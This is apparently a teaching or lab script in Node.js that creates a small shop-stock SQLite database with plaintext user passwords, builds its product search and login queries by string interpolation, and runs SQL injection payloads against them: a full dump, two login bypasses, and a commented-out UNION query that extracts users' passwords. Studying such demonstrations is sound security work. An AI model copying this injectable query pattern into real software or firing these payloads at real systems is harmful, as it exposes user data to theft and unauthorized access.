const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

db.exec(`
  CREATE TABLE IF NOT EXISTS products (
    id       INTEGER PRIMARY KEY,
    name     TEXT,
    price    REAL,
    cost     REAL,
    stock    INTEGER
  )
`);

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id       INTEGER PRIMARY KEY,
    username TEXT,
    password TEXT,
    role     TEXT
  )
`);

const productCount = db.prepare('SELECT COUNT(*) as count FROM products').get();
if (productCount.count === 0) {
  db.exec(`
    INSERT INTO products (name, price, stock) VALUES
      ('cement',  3500,50),
      ('nails',       2800, 30),
      ('timber',   7800, 20),
      ('paint',       12000, 15),
      ('iron sheets',   1800, 40)
  `);
}

const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get();
if (userCount.count === 0) {
  db.exec(`
    INSERT INTO users (username, password, role) VALUES
      ('admin',   'admin123',  'admin'),
      ('spellah',  'spe456',   'manager'),
      ('bency', 'ncy789',   'staff')
  `);
}

function searchProduct(name) {
  const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
  console.log('Query:', query);
  const rows = db.prepare(query).all();
  console.log('Result:', rows, '\n');
  return rows;
}


function login(username, password) {
  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  console.log('Query:', query);
  const row = db.prepare(query).get();
  console.log('Result:', row, '\n');
  return row;
}


console.log('===== Attack 1: Dump ALL products =====');
searchProduct("' OR 1=1--");

console.log('===== Attack 2: Login bypass (comment-out) =====');
login("admin'--", "anything");

console.log('===== Attack 3: Always-true login =====');
login("' OR '1'='1", "' OR '1'='1");

// console.log('===== Attack 4: UNION attack — steal users table =====');
// searchProduct("' UNION SELECT id, username, password, role FROM users--");
